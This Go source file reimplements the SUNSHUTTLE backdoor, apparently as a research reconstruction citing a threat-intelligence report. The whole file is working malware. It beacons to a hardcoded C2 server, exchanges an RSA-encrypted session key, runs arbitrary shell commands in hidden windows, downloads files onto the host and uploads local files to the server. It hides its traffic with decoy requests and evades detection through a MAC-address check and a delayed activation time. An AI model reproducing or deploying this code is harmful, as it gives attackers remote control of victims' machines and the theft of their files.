// Created by ~ ahm3dgg | 2025

package main

import (
	"bytes"
	"context"
	"crypto/md5"
	crand "crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/hex"
	"encoding/pem"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"syscall"
	"time"

	"github.com/ahm3dgg/shlex"
)

const (
	configKey        = "hz8l2fnpvp71ujfy8rht6b0smouvp9k8"
	configFileName   = "config.dat.tmp"
	defaultUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0"

	c2URL = "https://reyweb.com/assets/index.php"

	b64EncodedRSAPKey = "LS0tLS1CRUdJTiBQUklWQVRFIEtFWS0tLS0tCk1JSUVvd0lCQUFLQ0FRRUEwQWovM0szbS9yS05FU3dVZkhDOXFBaG5zTllBOWJKNEhRMzBEUHNmUER2YmJIWm0KVWo1bnlwMmFiallaWU1RYldhMitaTzRJeGdmZG0wRnpzQUgvaGFLSU40c1NrYncrWVJFU1lXMzVNbk1JM0FkZgptai9lSy95S05ibHlvZS83aVdQM256K3k0US9RSTBMNkJyRjdWb2RUYURZdER1cDNpSStCNXpqbWhFbGY5Rm1nClMxSmlEVWd5ZHo1VlhKUi9lc3Y2aEI3R01mRWIvM3NJQXp2NXFjd0V2R0s1SEgxRXpRN3pqYXV5aGJzRjlwSFIKekNGWWx2VzRPdGFVMG8zeGpWdWZvNVV3WVJTNXAvRUZwb2Y0NXp1SkdMSjAyY0tVbXhjME9YNTN0M0JuOVdYWQphRERoWXAvUlB6eXdHOE45Z1RCdjhyS3hSSXNGeHhLdSs4d0srUUlEQVFBQkFvSUJBR2U0aFBEZTEzT1hUQlFLCnVUQU4rZEVrVjZab0hGUmpwZFUrbHJZK0lpV2k1bFNlZDRkN3k3M09kQ2VNMjN4T2FpQjlLcGNod3NnUk5lRHAKY2llSDU0RVdOdm9TWWJDOWZSQmlOWnJUL05HMVh1NXMwcktTTTFBVStrZXM3VVZsNURCczRoSEk3WU9lb2JSaQorVXVMQTZaeGxCazZJWjcxTWFHcGd5Zm9TNjRhRE12WkR0Y2FURUd6dzZkUlFBVTkyNTVEVEljMllZYnE4TXFMCnpTYWZENWVCREgzSXptYmxnMGtYaWlkZWMxQTFzeXR6NXU4eFc0WGNrSGZwNHhlUExWdy9SdkxKR3FOSk1LNU0KN3RYQUZ3UHpnK3U0azdjZTd1Tnc5VldXN24yOFQ5eHpuVXV4MWd0UFFqMU42Z29EYUJhT3FZK2gwaWE5RjFSUAp3dTZadEcwQ2dZRUE4dkNGbUFHbU16NHZqTzA0RUx5UG52bmFTNkNSZVlDVnptdk51Z0lEbHhCTERHQ25LQlZ4CmV0N3FFazNnTWtidGNEVU9acFhRQUlWQ1dRTnVwQWhJMHQ1YmIvUGZ3M0h0SDNYdDVOUlVZbXd4VGdOUmUwNkQKaTRJQ3NnMis4VERpbmpuZTloenNFZTlEWUUyV1JydExNSitJUEQrUUU5NEozU2VpMDNrMXdwTUNnWUVBMnpnYQpUZmY2alFlTm45RzBpcEhhMUR2Sm1pOThweDUxbzByN1RVZlpSeEpmZ2c0Y2t5TXNaVUhLQUxyWnN6S0FueFA3Ck1YWXJKdU9IcHNwMEVaYzFlM3VUakZ6ckt5S1JUUTc4YzdNTkd2MDd3MVBsWnVOTHRrb3FlcFVqa1F6ZHhLWk8KZzlnRzBPNGxDNWpqblNnOGpVU0NoaFpuK2pyVThWeDdCeU9QOThNQ2dZQVdpNSs2Ulp6bzhJSjFMNmFlVndGMQpIWGJXd2VYK1FxS2tiM2krSkdXMDVUd3h2OTZEWjhvS1B4bTE3U2c3UWozU3hmbTZKM2tRTTAyKytRU1JrSHRCCnBvVVIxSzRWYzBNd1FqOTdsd0RseVdpaDlzamZDcUJHbUNBcjZmNm9YNE1JY0JKekFLZ2YyZmFFdjI2TXplRGkKZUV1cVc3UEJSRC9pR0VXU0hwT1FwUUtCZ1FEUmdWK2FUamswbVJoZnVnSEtRTFNiQ255VWozZVpHOElmaWlSNwphZ1FjS1ZIL3NFN2N5OHU5QmMveFBLR2I0ZE1NdFFMbTlXRXVMRnRUS3I4Y3BKOG5ZU1hWQ21SeDkvcFhZOUFmCkh1cVNkWnV0QkR3RVJZdnhMaFpFeXMyUDdYVHdZR1EvR3JFQThlZVRtczFGUDlRR3lvZlhjQWgxRzg2dzBNcC8KT3h4M0V3S0JnSFh4Z1FhNC9uZ1RsTU5oV1ArSXZIT2xPVkF4REsyR0wzWFFkcjhmdWRaZTljMWQ3VnpJYllqNgpnYndMVDlxaTB3RzVGQVdxSDE2M1h1Y0FpclQ2V0N0QUozdEswbGZiUzdvV0o3TC9WaDErdk9lNmpmUy9uUW5hCkFvMlFQYk44UmlsdEhlYUFxMFpmcmd3clF1UDVmbWlnbUJhNWxPV0lEL2VVMk9MbHZKR2kKLS0tLS1FTkQgUFJJVkFURSBLRVktLS0tLQo="
)

const (
	sendRetryTimeRangeStart = 5
	sendRetryTimeRangeEnd   = 15

	PayloadIdent = "i4zICToyI70Yeidf1f7rWjm5foKX2Usx"

	CommandType = "P5hCrabkKf"

	Cookie_HashTimeStamp = "HjELmFxKJc"
	Cookie_Unkn          = "b7XCoFSvs1YRW"

	// According to https://cloud.google.com/blog/topics/threat-intelligence/sunshuttle-second-stage-backdoor-targeting-us-based-entity
	Cookie_PayloadIdent = "iN678zYrXMJZ"

	Command_SendTimeStamp            = "3487wD9t2OZkvqdwRpqPeE"
	Command_ExecSysCommand           = "1kG4NaRX83BCMgLo38Bjq"
	Command_ExecSysCommandSendOutput = "hB0upT6CUmdRaR2KVBvxrJ"
	Command_ToggleFalseRequesting    = "aQJmWJzXdYK721mGBI3U"
	Command_FetchFile                = "TMuhGdA9EHY" // Block Size: 455179
	Command_ChangeBeaconingTime      = "zSsP2TSJJm3a"
	Command_ChangeUserAgent          = "W5VYP9Iu2uyHK"
	Command_UploadFile               = "HuLjdQwyCHI"
	Command_SetActivationTime        = "ubFxROBRwfswVRWNjLC"

	Command_KillSwitch = "13QTR5pC1R"

	AgentResp_MsgFileData = "i9tL7syTtS"

	CommandResult = "Dp3jaZ7if"

	AgentRespType_MsgFile         = "xpjQVt3bJzWuv"
	SrvCommand_CleanFile          = "do1KiqzhQ"
	SrvCommand_DownloadFile       = "t5UITQ2PdFg5"
	SrvCommand_RequestSessionKey  = "gZLXIeKI"
	SrvCommand_RetrieveSessionKey = "cIHiqD5p4da6OeB"

	MsgAck = "HuLjdQwyCH"
)

var (
	hashedTimeStamp string

	beaconingRangeStart int = 5
	beaconingRangeEnd   int = 15

	activationTime  int = 0
	falseRequesting int = 0

	userAgent string

	referers = []string{
		"www.google.com",
		"www.bing.com",
		"www.facebook.com",
		"www.yahoo.com",
	}

	fakeRequestsUrls = []string{
		"https://code.jquery.com/",
		"https://cdn.cloudflare.com/",
		"https://cdn.google.com/",
		"https://cdn.jquery.com/",
		"https://cdn.mxpnl.com/",
		"https://ssl.gstatic.com/ui/v3/icons",
		"https://reyweb.com/style.css",
		"https://reyweb.com/script.js",
		"https://reyweb.com/icon.ico",
		"https://reyweb.com/icon.png",
		"https://reyweb.com/scripts/jquery.js",
		"https://reyweb.com/scripts/bootstrap.js",
		"https://reyweb.com/css/style.css",
		"https://reyweb.com/css/bootstrap.css",
	}

	fileBlockSize = 256000

	falseRequestingStartTime  int64 = 1
	falseRequestingRangeStart       = 0x258
	falseRequestingRangeEnd         = 0x384

	falseRequestsCount = 5

	sessionKey string
)

func GetMD5Hash(s string) string {
	hash := md5.Sum([]byte(s))

	hashInHex := make([]byte, 2*len(hash))
	hex.Encode(hashInHex, hash[:])

	return string(hashInHex)
}

func write_file(filename string, data string) {
	f, _ := os.OpenFile(filename, os.O_RDWR, 0o644)
	f.Write([]byte(data))
	f.Sync()
	f.Close()
}

func define_internal_settings() {
	config, err := ioutil.ReadFile(configFileName)
	if err != nil {
		hconfig, _ := os.OpenFile(configFileName, os.O_TRUNC|os.O_CREATE|os.O_RDWR, 0o666)

		userAgent = defaultUserAgent
		hashedTimeStamp = GetMD5Hash(time.Now().String())
		sbeaconingRangeStart := strconv.FormatInt(int64(beaconingRangeStart), 10)
		sbeaconingRangeEnd := strconv.FormatInt(int64(beaconingRangeEnd), 10)
		sactivationTime := strconv.FormatInt(int64(activationTime), 10)
		sFalseRequesting := strconv.FormatInt(int64(falseRequesting), 10)

		config := hashedTimeStamp + "|" + sbeaconingRangeStart + "-" + sbeaconingRangeEnd + "|" + sactivationTime + "|" + sFalseRequesting + "|" + base64.StdEncoding.EncodeToString([]byte(userAgent))

		encryptedConfig, _ := aesEncrypt([]byte(configKey), config)

		write_file(configFileName, encryptedConfig)
		hconfig.Close()
	} else {
		decryptedConfig, _ := aesDecrypt([]byte(configKey), string(config))
		parts := strings.Split(decryptedConfig, "|")

		hashedTimeStamp = parts[0]
		falseRequesting, _ = strconv.Atoi(parts[2])
		activationTime, _ = strconv.Atoi(parts[3])

		decoded, _ := base64.StdEncoding.DecodeString(parts[4])
		userAgent = string(decoded)

		beaconingTimeRange := strings.Split(parts[1], "-")
		beaconingRangeStart, _ = strconv.Atoi(beaconingTimeRange[0])
		beaconingRangeEnd, _ = strconv.Atoi(beaconingTimeRange[1])
	}
}

func request_session_key() int {
	req, _ := http.NewRequestWithContext(context.Background(), http.MethodGet, c2URL, nil)
	randReferrer := referers[rand.Intn(len(referers))]

	req.Header.Set("Referer", randReferrer)
	req.Header.Set("User-Agent", userAgent)

	req.AddCookie(&http.Cookie{
		Name:  Cookie_HashTimeStamp,
		Value: hashedTimeStamp,
	})

	req.AddCookie(&http.Cookie{
		Name:  CommandType,
		Value: SrvCommand_RequestSessionKey,
	})

	req.AddCookie(&http.Cookie{
		Name:  Cookie_PayloadIdent,
		Value: PayloadIdent,
	})

	req.AddCookie(&http.Cookie{
		Name:  Cookie_Unkn,
		Value: "78",
	})

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	resp, err := client.Do(req)
	if err != nil {
		return -1
	}

	buf, _ := ioutil.ReadAll(resp.Body)

	if strings.TrimSpace(string(buf)) == MsgAck {
		resp.Body.Close()
		return 1
	} else {
		resp.Body.Close()
		return -1
	}
}

func retrieve_session_key() string {
	req, _ := http.NewRequestWithContext(context.Background(), http.MethodGet, c2URL, nil)
	randReferer := referers[rand.Intn(len(referers))]

	req.Header.Set("Referer", randReferer)
	req.Header.Set("User-Agent", userAgent)

	req.AddCookie(&http.Cookie{
		Name:  Cookie_HashTimeStamp,
		Value: hashedTimeStamp,
	})

	req.AddCookie(&http.Cookie{
		Name:  CommandType,
		Value: SrvCommand_RetrieveSessionKey,
	})

	req.AddCookie(&http.Cookie{
		Name:  Cookie_PayloadIdent,
		Value: PayloadIdent,
	})

	req.AddCookie(&http.Cookie{
		Name:  Cookie_Unkn,
		Value: "78",
	})

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	resp, err := client.Do(req)
	if err != nil {
		return "-1"
	}

	buf, _ := ioutil.ReadAll(resp.Body)
	resp.Body.Close()
	return string(buf)
}

func false_requesting(requests int) {
	fmt.Println("Making: ", requests, " fake requests")

	for range requests {
		fakeRequestURL := fakeRequestsUrls[rand.Intn(len(fakeRequestsUrls))]
		randReferrer := referers[rand.Intn(len(referers))]

		req, _ := http.NewRequestWithContext(context.Background(), http.MethodGet, fakeRequestURL, nil)

		req.Header.Set("Referer", randReferrer)
		req.Header.Set("User-Agent", userAgent)

		client := &http.Client{
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			},
		}

		client.Do(req)
	}
}

func random(min, max int) int {
	rand.Seed(time.Now().Unix())
	return rand.Intn(max-min) + min
}

func beaconing() string {
	req, _ := http.NewRequestWithContext(context.Background(), http.MethodGet, c2URL, nil)
	randReferer := referers[rand.Intn(len(referers))]

	req.Header.Set("Referer", randReferer)
	req.Header.Set("User-Agent", userAgent)

	req.AddCookie(&http.Cookie{
		Name:  Cookie_HashTimeStamp,
		Value: hashedTimeStamp,
	})

	req.AddCookie(&http.Cookie{
		Name:  Cookie_PayloadIdent,
		Value: PayloadIdent,
	})

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	resp, err := client.Do(req)
	if err != nil {
		return ""
	}

	buf, _ := ioutil.ReadAll(resp.Body)

	return string(buf)
}

func send_command_result(result string) string {
	eresult, _ := aesEncrypt([]byte(sessionKey), result)
	encoded := base64.StdEncoding.EncodeToString([]byte(eresult))

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	response := url.Values{}
	response.Set(CommandResult, string(encoded))
	response.Set("KFy8AlFS0Q3M", "")

	req, _ := http.NewRequestWithContext(context.Background(), http.MethodPost, c2URL, bytes.NewReader([]byte(response.Encode())))

	randReferer := referers[rand.Intn(len(referers))]
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; param=value")
	req.Header.Set("Referer", randReferer)
	req.Header.Set("User-Agent", userAgent)

	req.AddCookie(&http.Cookie{
		Name:  Cookie_HashTimeStamp,
		Value: hashedTimeStamp,
	})

	req.AddCookie(&http.Cookie{
		Name:  CommandType,
		Value: "S4rgG1WifHU",
	})

	req.AddCookie(&http.Cookie{
		Name:  Cookie_PayloadIdent,
		Value: PayloadIdent,
	})

	for {
		resp, err := client.Do(req)

		if err != nil {
			time.Sleep(time.Second * time.Duration(random(sendRetryTimeRangeStart, sendRetryTimeRangeEnd)))
			continue
		}

		buf, _ := ioutil.ReadAll(resp.Body)

		if string(buf) == MsgAck {
			return string(buf)
		}

		time.Sleep(time.Second * time.Duration(random(sendRetryTimeRangeStart, sendRetryTimeRangeEnd)))
	}
}

func save_internal_settings() {
	sbeaconingRangeStart := strconv.FormatInt(int64(beaconingRangeStart), 10)
	sbeaconingRangeEnd := strconv.FormatInt(int64(beaconingRangeEnd), 10)
	sactivationTime := strconv.FormatInt(int64(activationTime), 10)
	sFalseRequesting := strconv.FormatInt(int64(falseRequesting), 10)

	config := hashedTimeStamp + "|" + sbeaconingRangeStart + "-" + sbeaconingRangeEnd + "|" + sactivationTime + "|" + sFalseRequesting + "|" + base64.StdEncoding.EncodeToString([]byte(userAgent))

	encryptedConfig, _ := aesEncrypt([]byte(configKey), config)

	write_file(configFileName, encryptedConfig)
}

func delete_empty(s []string) []string {
	var r []string
	for _, str := range s {
		if str != "" {
			r = append(r, str)
		}
	}
	return r
}

func wget_file(fetchFileCtx string) string {
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	req, _ := http.NewRequestWithContext(context.Background(), http.MethodGet, c2URL, nil)

	randReferer := referers[rand.Intn(len(referers))]
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; param=value")
	req.Header.Set("Referer", randReferer)
	req.Header.Set("User-Agent", userAgent)

	req.AddCookie(&http.Cookie{
		Name:  Cookie_HashTimeStamp,
		Value: hashedTimeStamp,
	})

	req.AddCookie(&http.Cookie{
		Name:  CommandType,
		Value: SrvCommand_DownloadFile,
	})

	req.AddCookie(&http.Cookie{
		Name:  "TjZIpGWvg",
		Value: fetchFileCtx,
	})

	for {
		resp, err := client.Do(req)
		if err != nil {
			time.Sleep(time.Second * time.Duration(random(sendRetryTimeRangeStart, sendRetryTimeRangeEnd)))
			continue
		}

		buf, _ := ioutil.ReadAll(resp.Body)

		if strings.Index(string(buf), MsgAck) >= 0 {
			return strings.Replace(string(buf), MsgAck, "", 1)
		}

		time.Sleep(time.Second * time.Duration(random(sendRetryTimeRangeStart, sendRetryTimeRangeEnd)))
	}
}

func clean_file(fetchFileCtx string) {
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	req, _ := http.NewRequestWithContext(context.Background(), http.MethodGet, c2URL, nil)

	randReferer := referers[rand.Intn(len(referers))]
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; param=value")
	req.Header.Set("Referer", randReferer)
	req.Header.Set("User-Agent", userAgent)

	req.AddCookie(&http.Cookie{
		Name:  Cookie_HashTimeStamp,
		Value: hashedTimeStamp,
	})

	req.AddCookie(&http.Cookie{
		Name:  CommandType,
		Value: SrvCommand_CleanFile,
	})

	req.AddCookie(&http.Cookie{
		Name:  "TjZIpGWvg",
		Value: fetchFileCtx,
	})

	for {
		resp, err := client.Do(req)
		if err != nil {
			time.Sleep(time.Second * time.Duration(random(sendRetryTimeRangeStart, sendRetryTimeRangeEnd)))
			continue
		}

		buf, _ := ioutil.ReadAll(resp.Body)

		if string(buf) == MsgAck {
			break
		}

		time.Sleep(time.Second * time.Duration(random(sendRetryTimeRangeStart, sendRetryTimeRangeEnd)))
	}
}

func send_file_part(filePart string) string {
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	response := url.Values{}

	encryptedFileParth, _ := aesEncrypt([]byte(sessionKey), filePart)
	response.Set(AgentResp_MsgFileData, base64.StdEncoding.EncodeToString([]byte(encryptedFileParth)))

	req, _ := http.NewRequestWithContext(context.Background(), http.MethodPost, c2URL, bytes.NewReader([]byte(response.Encode())))

	randReferer := referers[rand.Intn(len(referers))]
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; param=value")
	req.Header.Set("Referer", randReferer)
	req.Header.Set("User-Agent", userAgent)

	req.AddCookie(&http.Cookie{
		Name:  CommandType,
		Value: AgentRespType_MsgFile,
	})

	for {
		resp, _ := client.Do(req)
		buf, _ := ioutil.ReadAll(resp.Body)

		if strings.Index(string(buf), MsgAck) >= 0 {
			return strings.Replace(string(buf), MsgAck, "", 1)
		}

		time.Sleep(time.Second * time.Duration(random(sendRetryTimeRangeStart, sendRetryTimeRangeEnd)))
	}
}

func fileExists(path string) bool {
	stat, err := os.Stat(path)

	if errors.Is(err, os.ErrNotExist) {
		return false
	}

	return !stat.IsDir()
}

func resolve_command(command string) {
	parts := strings.Split(command, "*")

	command = parts[1]
	dcommand, _ := base64.StdEncoding.DecodeString(command)
	command, _ = aesDecrypt([]byte(sessionKey), string(dcommand))

	killAgent := false
	commandResult := ""

	if command == Command_KillSwitch {
		commandResult = "ok"
		killAgent = true
	} else {
		if strings.Index(command, Command_ChangeBeaconingTime) >= 0 {
			args := strings.Split(command, Command_ChangeBeaconingTime+" ")
			trange := strings.Split(args[1], "|")
			beaconingRangeStart, _ = strconv.Atoi(trange[1])
			beaconingRangeEnd, _ = strconv.Atoi(trange[2])
			commandResult = "ok"
		} else if strings.Index(command, Command_ToggleFalseRequesting) >= 0 {
			args := strings.Split(command, Command_ToggleFalseRequesting+" ")
			falseRequesting, _ = strconv.Atoi(args[1])
			commandResult = "ok"
			save_internal_settings()
		} else if strings.Index(command, Command_ChangeUserAgent) >= 0 {
			args := strings.Split(command, Command_ChangeUserAgent+" ")
			userAgent = args[1]
			commandResult = "ok"
			save_internal_settings()
		} else if strings.Index(command, Command_SendTimeStamp) >= 0 {
			result := time.Now().Format("20060102150405MST5")
			commandResult = result
			send_command_result(result)
		} else if strings.Index(command, Command_SetActivationTime) >= 0 {
			args := strings.Split(command, Command_SetActivationTime+" ")
			t, _ := time.Parse("20060102150405MST5", args[1])
			activationTime = int(t.Unix())
			commandResult = "ok"
			save_internal_settings()
		} else if strings.Index(command, "<>") >= 0 {
			args := strings.Split(command, "|")
			filePath := args[0]
			fetchFileCtx := args[1]

			f, _ := os.OpenFile(filePath, os.O_TRUNC|os.O_CREATE|os.O_RDWR, 0o666)

			parts := delete_empty(strings.Split(fetchFileCtx, "<>"))

			data := ""

			for _, ctx := range parts {
				decoded, _ := base64.StdEncoding.DecodeString(wget_file(ctx))
				decrypted, _ := aesDecrypt([]byte(sessionKey), string(decoded))
				data += decrypted
				clean_file(ctx)
			}

			buf := new(bytes.Buffer)
			b64Decoder := base64.NewDecoder(base64.StdEncoding, strings.NewReader(data))
			io.Copy(buf, b64Decoder)

			f.Write(buf.Bytes())
			commandResult = "ok"
		} else if strings.Index(command, Command_FetchFile) >= 0 {
			args := strings.Split(command, Command_FetchFile+" ")
			filePath := args[1]

			if !fileExists(filePath) {
				commandResult = "File doesn't exist"
			} else {
				f, _ := os.OpenFile(filePath, os.O_RDONLY, 0)
				finfo, _ := f.Stat()

				var buf []byte
				sentSize := 0
				result := ""

				fsize := finfo.Size()
				for sentSize < int(fsize) {
					if fileBlockSize >= int(fsize) {
						buf = make([]byte, fsize)
						sentSize += int(fsize)
					} else {
						buf = make([]byte, fileBlockSize)
						sentSize += fileBlockSize
					}

					n, _ := f.Read(buf)
					result += ";" + send_file_part(string(buf[:n]))
				}

				commandResult = result
			}
		} else if strings.Index(command, Command_ExecSysCommand) >= 0 {
			args := strings.Split(command, Command_ExecSysCommand+" ")
			exec.Command(args[1]).Start()
			commandResult = "EXECED"
		} else if strings.Index(command, Command_ExecSysCommandSendOutput) >= 0 {
			args := strings.Split(command, Command_ExecSysCommandSendOutput+" ")
			output, err := exec.Command(args[1]).Output()
			if err != nil {
				commandResult = "Some error in execSystemFunction"
			} else {
				commandResult = string(output)
			}
		} else {
			splits, _ := shlex.Split(strings.TrimSpace(command))

			cmdArgs := []string{}
			cmdArgs = append(cmdArgs, "/c")
			cmdArgs = append(cmdArgs, splits...)

			cmd := exec.Command("cmd", cmdArgs...)
			cmd.SysProcAttr = &syscall.SysProcAttr{}
			cmd.SysProcAttr.HideWindow = true

			var stdout bytes.Buffer
			cmd.Stdout = &stdout

			err := cmd.Run()
			if err != nil {
				commandResult = err.Error()
			} else {
				commandResult = stdout.String()
			}
		}
	}

	send_command_result(commandResult)

	if killAgent {
		os.Exit(0)
	}
}

func main() {
	netifs, err := net.Interfaces()
	if err != nil {
		os.Exit(1)
	}

	for _, netiff := range netifs {
		if netiff.HardwareAddr.String() == "c8:27:cc:c2:37:5a" {
			os.Exit(1)
		}
	}

	rand.Seed(time.Now().Unix())

	define_internal_settings()

	if activationTime > int(time.Now().Unix()) {
		os.Exit(0)
	}

	if falseRequesting != 0 {
		go false_requesting(rand.Intn(falseRequestsCount))
	}

	for request_session_key() != 1 {
		time.Sleep(time.Second * time.Duration(random(sendRetryTimeRangeStart, sendRetryTimeRangeEnd)))
	}

	for {
		t := time.Second * time.Duration(random(sendRetryTimeRangeStart, sendRetryTimeRangeEnd))
		time.Sleep(t)

		if falseRequesting == 1 {
			off := int64(random(falseRequestingRangeStart, falseRequestingRangeEnd))
			t := time.Now().Unix()

			if falseRequestingStartTime+off < t {
				go false_requesting(rand.Intn(falseRequestsCount))
				falseRequestingStartTime = time.Now().Unix()
			}
		}

		key := retrieve_session_key()

		if key == "78" || key == "-1" {
			continue
		} else if key == "0" {
			for request_session_key() != 1 {
				time.Sleep(time.Second * time.Duration(random(sendRetryTimeRangeStart, sendRetryTimeRangeEnd)))
			}
		} else if len(key) != 0 {
			decodedRSAKey, _ := base64.StdEncoding.DecodeString(b64EncodedRSAPKey)
			rsaKeyBlock, _ := pem.Decode(decodedRSAKey)
			parsedPrivKey, _ := x509.ParsePKCS1PrivateKey(rsaKeyBlock.Bytes)

			decodedKey, _ := base64.StdEncoding.DecodeString(key)
			decryptedKey, _ := rsa.DecryptOAEP(sha256.New(), crand.Reader, parsedPrivKey, decodedKey, nil)

			sessionKey = string(decryptedKey)

			if len(sessionKey) != 0x20 {
				continue
			}

			time.Sleep(t)
			break
		}
	}

	for {
		sleepTime := random(beaconingRangeStart, beaconingRangeEnd)

		if falseRequesting == 1 {
			off := int64(random(falseRequestingRangeStart, falseRequestingRangeEnd))
			t := time.Now().Unix()

			if falseRequestingStartTime+off < t {
				go false_requesting(rand.Intn(falseRequestsCount))
				falseRequestingStartTime = time.Now().Unix()
			}
		}

		command := beaconing()

		if len(command) != 0 {
			go resolve_command(command)
		}

		time.Sleep(time.Second * time.Duration(sleepTime))
	}
}
